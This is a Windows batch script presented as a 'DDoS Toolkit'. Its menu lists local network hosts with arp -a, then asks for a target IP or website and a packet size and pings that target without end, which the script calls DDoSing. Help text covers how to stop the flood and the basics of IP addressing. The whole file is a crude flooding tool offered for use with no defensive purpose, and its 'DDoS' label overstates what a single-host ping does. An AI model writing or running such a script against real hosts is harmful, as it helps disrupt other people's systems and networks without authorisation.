@echo off
:start
title DDos Toolkit - Home
color 0A
cls
echo.
echo  -1: IP Scanning
echo  -2: DDoS
echo  -3: Help
set /p START=What Do You Want To Do?
goto %START%

:1
::IP Scanning
cls
title DDoS Toolkit - IP Scanning
arp -a
pause
exit

:2
::CMD DDoS
title DDoS Toolkit - CMD DDoS
cls
set /p IP= What IP/Website Do You Want To DDos?
set /p PACKETSIZE= How Many Bytes Per Packet Do You Want To DDoS %IP% With?
cls
title DDosing...
ping %IP% -t -l %PACKETSIZE%

:3
::Help
title DDoS Toolkit - Help
cls
echo  -A: Stopping DDos
echo  -B: IP Scanning Info
echo  -C: Static vs Dynamic IP's
set /p HELP=What Do You Want Help With?
goto %HELP%

:A
::Stopping DDos
cls
title DDos Toolkit - Help (Stopping DDos)
echo  To stop a DDoS, lick CTRL+C, then type either Y or N
pause
exit

:B
::IP Scanning Info
cls
title DDoS Toolkit - Help (IP Scanning Info)
echo The IP Scanning Function Showes all ip's
echo on the network you are connected to that
echo have communicated with your PC
pause
exit

:C
::Staic vs Dynamic IP's
cls
title DDoS Toolkit - Help (Static vs Dynamic IP's)
echo Static IP addresses are fixed and do not change.
echo They are used by devices like servers and network
echo equipment that need a consistent address.
echo Dynamic IP addresses are assigned automatically
echo by your router and can change over time.
echo Most everyday devices, like computers and phones,
echo use dynamic IPs because it makes managing the network
echo easier.
echo Knowing whether an IP is static or dynamic helps you
echo understand the stability of the network device you are
echo scanning.
pause
exit